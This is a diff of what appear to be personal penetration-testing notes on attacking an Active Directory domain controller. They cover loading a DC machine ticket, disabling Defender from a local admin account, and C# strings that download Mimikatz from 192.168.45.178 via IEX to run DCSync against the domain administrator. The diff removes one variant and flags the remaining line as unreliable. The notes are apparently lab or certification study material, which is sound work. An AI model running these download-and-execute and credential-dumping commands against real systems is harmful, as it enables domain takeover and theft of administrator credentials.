@@ -48,15 +48,11 @@ String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.
 5) Load the DC machine account ticket into your current domain user; and attempt to DCSync. Prior to loading mimikatz, you may need to find someway to disable defender. This can be done via a LOCAL high priv account (For example from LAPS) and disable the defender via another shell.
 
 ```csharp
-// Watch the quotation marks! 
+// Watch the quotation marks! Problematic and hard to get this to work. Don't use this until I can figure this out!
 String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command "`"lsadump::dcsync /domain:infinity.com /user:infinity\\administrator`""";
 ```
 
-```csharp
-String cmdmimi = "lsadump::dcsync /domain:infinity.com /user:infinity\\administrator";
-
-String cmd2 = $"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command {cmdmimi} | Out-File -FilePath C:\\windows\\tasks\\dcsync.txt";
-```
+Instead use the interactive C# code in the AppLocker.md to run Invoke-Mimikatz
 
 
 *ALTERNATIVE WAY*
